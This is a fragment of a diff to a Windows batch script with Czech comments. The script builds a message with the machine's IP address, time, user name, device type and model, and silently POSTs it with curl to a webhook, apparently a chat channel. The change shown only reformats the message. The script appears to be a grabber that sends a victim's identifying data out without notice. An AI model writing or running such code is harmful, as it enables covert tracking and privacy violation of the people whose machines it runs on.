@@ -41,8 +41,8 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
     )
 )
 
-:: 🧾 Hezky formátovaná zpráva – jen IP mezi ||
-set "msg=🛰️ **Systémové info**\nIP: ||!ip!||\nČas: !timestamp!\nUživatel: !user!\nZařízení: !deviceType!\nModel: !deviceModel!"
+:: 🧾 Zpráva – IP s ||, ostatní bez
+set "msg=🛰️ **Systémové info**\nIP: ||!ip! ||\nČas: !timestamp!\nUživatel: !user!\nZařízení: !deviceType!\nModel: !deviceModel!"
 
 :: 📤 Odeslání na webhook
 curl -s -X POST %webhook% -d "content=!msg!" >nul
